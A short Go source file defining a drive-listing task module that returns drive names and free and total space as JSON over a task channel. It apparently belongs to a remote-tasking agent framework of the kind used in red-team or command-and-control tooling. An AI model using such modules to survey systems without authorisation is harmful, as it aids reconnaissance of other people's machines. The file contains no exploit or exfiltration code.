package drives

import (
	"encoding/json"

	"pkg/utils/structs"
)

type Drive struct {
	Name             string `json:"name"`
	Description      string `json:"description"`
	FreeBytes        uint64 `json:"free_bytes"`
	TotalBytes       uint64 `json:"total_bytes"`
	FreeBytesPretty  string `json:"free_bytes_pretty"`
	TotalBytesPretty string `json:"total_bytes_pretty"`
}

//Run - Function that executes the shell command
func Run(task structs.Task, threadChannel chan<- structs.ThreadMsg) {
	tMsg := structs.ThreadMsg{}
	tMsg.TaskItem = task
	// args := &Arguments{}
	// err := json.Unmarshal([]byte(task.Params), args)
	// if err != nil {
	// 	tMsg.TaskResult = []byte(err.Error())
	// 	tMsg.Error = true
	// 	threadChannel <- tMsg
	// 	return
	// }

	res, err := listDrives()

	if err != nil {
		tMsg.TaskResult = []byte(err.Error())
		tMsg.Error = true
		threadChannel <- tMsg
		return
	}

	driveJson, err := json.MarshalIndent(res, "", "    ")
	tMsg.TaskResult = driveJson
	tMsg.Error = false
	tMsg.Completed = true
	threadChannel <- tMsg
}
